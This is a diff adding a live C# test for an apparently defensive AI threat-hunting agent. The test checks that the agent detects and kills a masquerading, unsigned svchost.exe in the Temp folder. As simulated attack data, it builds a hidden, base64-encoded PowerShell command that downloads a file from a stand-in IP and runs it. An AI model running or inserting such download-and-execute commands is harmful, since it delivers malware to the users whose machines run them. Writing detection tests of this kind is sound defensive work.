@@ -931,6 +931,132 @@ public class AutonomousHunterAgentTests
         Assert.True(res.Traces.Count >= 4, $"4턴 이상의 복합 수사가 전개되어야 함: 현재 {res.Traces.Count}턴");
     }
 
+    /// <summary>
+    /// [FileInspectionTool 결합 실측 Live 검증]
+    /// 동일한 복합 회피 공격(미등록 IP + C:\Windows\Temp\svchost.exe 위장)에 대해 FileInspectionTool을 주입했을 때
+    /// Gemini 에이전트가 Step 2에서 FileInspectionTool을 성공적으로 호출하여 경로 위장(T1036.005) 및 무서명을 즉각 포착하고,
+    /// 턴 수와 수사 시간이 어떻게 변화하는지 실시간 LLM 통신으로 실측 대조.
+    /// </summary>
+    [Fact(Timeout = 60000)]
+    [Trait("Category", "Live")]
+    public async Task TestLive_ConvolutedEvasiveAttack_WithFileInspectionTool()
+    {
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool(),
+            new FileInspectionTool()
+        };
+
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        if (!agent.IsOnlineGemini)
+        {
+            _output.WriteLine("[안내] 유효한 Gemini/Vertex AI 인증정보가 감지되지 않아 Live 테스트를 건너뜁니다.");
+            return;
+        }
+
+        // Clean-Room 모의 파일 주입
+        FileInspectionTool.RegisterSimulatedFile(@"C:\Windows\Temp\svchost.exe", new FileInspectionTool.SimulatedFileEntry(
+            Exists: true,
+            FileSizeBytes: 124928L,
+            Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            Entropy: 7.4521,
+            IsSigned: false,
+            SignerSubject: string.Empty,
+            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
+            IsPathMasqueraded: true,
+            IsDisguisedExecutable: false,
+            AnomalyScore: 100,
+            DiagnosticReason: "시스템 핵심 바이너리 파일명이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
+        ));
+
+        try
+        {
+            // 부모: explorer.exe
+            treeManager.ApplySnapshotBatch(new[]
+            {
+                new ProcessEvent
+                {
+                    ProcessId = 6001,
+                    ImageName = "explorer.exe",
+                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
+                }
+            });
+
+            // 타깃: powershell.exe -w hidden -enc <미등록 IP 198.51.100.99로부터 update.dat를 받아 C:\Windows\Temp\svchost.exe로 저장 및 실행>
+            string evasiveScript = "$u='http://198.51.100.99/update.dat'; $p='C:\\Windows\\Temp\\svchost.exe'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
+            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(evasiveScript));
+            string fullCmd = $"powershell.exe -w hidden -enc {b64}";
+
+            treeManager.ApplyDeltaEvent(new ProcessEvent
+            {
+                ProcessId = 6002,
+                ParentProcessId = 6001,
+                ImageName = "powershell.exe",
+                CommandLine = fullCmd,
+                IsSuspended = true,
+                Lifecycle = ProcessLifecycle.LifecycleSuspended
+            });
+
+            var targetNode = treeManager.FindActiveNodeByPid(6002);
+            Assert.NotNull(targetNode);
+
+            var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+
+            _output.WriteLine("=========================================================================================");
+            _output.WriteLine($"   PHALANX CONVOLUTED EVASION (WITH FILE TOOL) LIVE AUDIT (TURNS: {res.Traces.Count})");
+            _output.WriteLine("=========================================================================================");
+            _output.WriteLine($"[VERDICT] {res.VerdictAction} (Confidence: {res.Confidence:P0})");
+            _output.WriteLine($"[TITLE] {res.SummaryTitle}");
+            _output.WriteLine($"[ELAPSED] {res.Elapsed.TotalMilliseconds:F0}ms");
+            _output.WriteLine($"[NARRATIVE]\n{res.Narrative}");
+            _output.WriteLine("-----------------------------------------------------------------------------------------");
+            foreach (var trace in res.Traces)
+            {
+                _output.WriteLine($"▶ [Turn {trace.StepNumber}] Tool: {trace.ActionTool} | Latency: {trace.ElapsedMs:F0}ms");
+                _output.WriteLine($"   Thought: {trace.Thought}");
+                _output.WriteLine($"   Observation: {trace.Observation}");
+            }
+
+            var audit = new
+            {
+                Scenario = "Convoluted Evasive Masquerading Attack (With FileInspectionTool)",
+                TotalTurns = res.Traces.Count,
+                TotalElapsedMs = res.Elapsed.TotalMilliseconds,
+                Verdict = res.VerdictAction.ToString(),
+                Confidence = res.Confidence,
+                Title = res.SummaryTitle,
+                Narrative = res.Narrative,
+                MitreTactics = res.MitreTactics,
+                Steps = res.Traces.Select(t => new
+                {
+                    Step = t.StepNumber,
+                    ElapsedMs = t.ElapsedMs,
+                    Tool = t.ActionTool,
+                    Thought = t.Thought,
+                    Observation = t.Observation
+                }).ToList()
+            };
+
+            string path = Path.Combine(AppContext.BaseDirectory, "convoluted_attack_with_file_tool_audit.json");
+            File.WriteAllText(path, JsonSerializer.Serialize(audit, new JsonSerializerOptions { WriteIndented = true }));
+
+            // 검증: 최종 판결 ACTION_KILL 및 FileInspectionTool 호출 성공 확인
+            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
+            Assert.Contains(res.Traces, t => t.ActionTool == "FileInspectionTool" && !t.Observation.Contains("존재하지 않는 도구"));
+        }
+        finally
+        {
+            FileInspectionTool.ClearSimulatedFiles();
+        }
+    }
+
     [Fact]
     [Trait("Category", "Unit")]
     public void TestReflexKillRemediationAndAdaptiveLatencyFormatting()
